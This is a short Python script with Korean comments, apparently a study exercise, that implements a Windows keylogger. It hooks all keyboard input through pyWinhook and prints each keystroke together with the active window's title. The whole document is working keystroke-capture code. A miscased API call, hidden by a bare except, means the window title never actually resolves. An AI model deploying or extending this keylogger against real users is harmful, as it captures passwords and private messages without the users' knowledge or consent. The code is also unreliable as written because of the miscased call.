import win32gui  # 네이티브 win32 GUI API 모듈  pyWinhook 모듈 설치 시 자동 설치된다.
import pythoncom  # window OLE 자동화 API 캡슐화 모듈
import pyWinhook as pyHook  # pywinhook rename pyhook

curWindow = None  # 키보드 입력 발생하는 애플리케이션 윈도우 변경 체크


def getCurWinTitle():  # 입력이 이루어지는 윈도우 타이틀 출력
    global curWindow
    try:
        hwnd = win32gui.GetForegroundWindow()  # 포커스 되어 있는 윈도우 핸들을 hwnd에 저장.
        winTitle = win32gui.GetwindowText(hwnd)  # hwnd change text
        if winTitle != curWindow:  # curWindow와 윈도우 타이틀 비교
            curWindow = winTitle
            print('\n[%s]' % winTitle)  # 입력하는 윈도우 애플리케이션 타이틀 출력

    except:  # 예외처리
        # 입력 에러 시 출력 / pywin32 패키지가 python 3.5에서 동작 안하는 경우가 있음..
        print('\n[Unkown window]')
        pass


def OnKeyboardEvent(event):  # 키보드 입력 후킹 콜백함수
    getCurWinTitle()
    print('++ Key :', event.Key, end='')  # event.key = 입력 값
    # print(' KeyID:', event.KeyID)
    return True


def main():
    hm = pyHook.HookManager()  # 객체 생성
    hm.KeyDown = OnKeyboardEvent  # keydown 함수 호출 << 이벤트 입력 keydown 함수에 저장
    hm.HookKeyboard()  # 키보드 후킹 설정함수
    pythoncom.PumpMessages()  # OS상에서 입력된 이벤트를 모두 전송 받을 수 있는 대기상태


if __name__ == '__main__':
    main()
